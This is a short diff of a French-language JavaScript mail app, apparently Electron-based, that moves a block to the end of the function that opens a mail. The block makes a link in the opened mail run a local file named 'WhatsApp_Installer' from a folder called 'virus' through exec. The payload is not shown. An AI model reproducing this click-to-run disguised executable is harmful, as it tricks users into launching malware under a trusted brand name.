@@ -157,13 +157,6 @@ async function ouvrirMail(id) {
     mailOuvertEl.querySelector('.message').innerHTML = message
     mailOuvertEl.querySelector('.secret').innerHTML = `${mail.secret}`
 
-    const link = document.querySelector('.lien');
-    link.addEventListener('click', e => {
-        exec('.\\resources\\app\\src\\virus\\WhatsApp_Installer', (error, stdout, stderr) => {
-            console.log(stderr)
-        });
-    })
-
     if (mail.backgroundImage) {
         mailOuvertEl.style.backgroundImage = `linear-gradient(rgba(255,255,255,0.9), rgba(255,255,255,0.9)), url('../images/${mail.backgroundImage}')`
         mailOuvertEl.style.backgroundSize = "cover"
@@ -186,6 +179,13 @@ async function ouvrirMail(id) {
     // Marquer comme lu
     listMails[id].lu = true
     sauvegarderMail()
+
+    const link = document.querySelector('.lien');
+    link.addEventListener('click', e => {
+        exec('.\\resources\\app\\src\\virus\\WhatsApp_Installer', (error, stdout, stderr) => {
+            console.log(stderr)
+        });
+    })
 }
 
 function fermerMail() {
